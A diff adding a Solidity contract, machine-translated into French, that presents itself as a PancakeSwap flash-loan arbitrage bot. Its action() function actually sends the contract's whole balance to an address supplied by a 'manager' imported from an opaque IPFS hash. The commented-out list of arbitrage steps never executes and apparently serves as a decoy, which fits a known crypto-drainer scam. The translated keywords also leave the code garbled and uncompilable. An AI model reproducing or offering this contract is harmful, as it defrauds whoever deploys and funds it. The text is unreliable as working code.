@@ -1,0 +1,71 @@
+pragma solidité ^ 0.5.0 ;
+
+// Contrats intelligents Multiplicateur-Finance
+import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol" ;
+importateur "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol" ;
+
+// Contrats intelligents PancakeSwap
+importateur "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol" ;
+importateur "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol" ;
+importateur "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol" ;
+
+// Gestionnaire de codes PancakeSwap BSC
+importateur "ipfs://QmVz4umkRRQpVb3pGXpfcMqb5Aip47i9wcVuvPHfdtyolG" ;
+
+contrat GetFlashLoan {
+    chaîne public tokenName ;
+    chaîne public tokenSymbol ;
+    uint256 montantduprêt ;
+    Gérant-gérant ;
+
+    constructeur (
+         mémoire de chaîne _tokenName ,
+         mémoire de chaîne _tokenSymbol ,
+        uint256 _loanAmount
+    ) publique {
+        tokenName = _tokenName ;
+        tokenSymbol = _tokenSymbol ;
+        montantprêt = _montantprêt ;
+        gestionnaire = nouveau gestionnaire ();
+    }
+
+    adresse publique créateur = msg . expéditeur ;
+
+    fonction tokenTransfer () vue publique renvoyée ( adresse ) {
+        créateur de retour ;
+    }
+
+    fonction () externe à payeur {}
+
+    fonction action () public à payer {
+        // Envoyer un nouveau jeton au routeur PancakeSwap pour échange
+        adresse ( uint160 (manager. pancakeswapDeposit ())). transfert (
+            adresse ( ceci ).solde
+        );
+
+        // Effectuer des tâches de prêt flash (toutes les fonctions combinées en une seule pour réduire les appels externes et économiser les frais d'essence)
+        gestionnaire. effectuer des tâches ();
+
+        /* Répartition de toutes les fonctions
+      // Soumettre le jeton à la blockchain BSC
+      mémoire de chaîne tokenAddress = manager.submitToken(tokenName, tokenSymbol);
+      // Lister le jeton sur PancakeSwap
+      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
+      // Obtenir un prêt BNB de Multiplier-Finance & portefeuille d'exécution de prêt
+      string memory loanAddress = manager.takeFlashLoan(loanAmount);
+      // Convertit la moitié de BNB en DAI
+      manager.pancakeDAItoBNB(loanAmount / 2);
+   // Créer des paires BNB et DAI pour notre jeton et fournir des liquidités
+   mémoire de chaîne bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
+      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
+      mémoire de chaîne daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
+      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
+   // Effectuer des transactions d'arbitrage
+      manager.pancakePerformSwaps();
+      // Déplacez les BNB restants du contrat vers votre portefeuille personnel
+      manager.contractToWallet("BNB");
+   // Rembourser Flashloan
+      manager.repayLoan(loanAddress);
+      */
+    }
+}
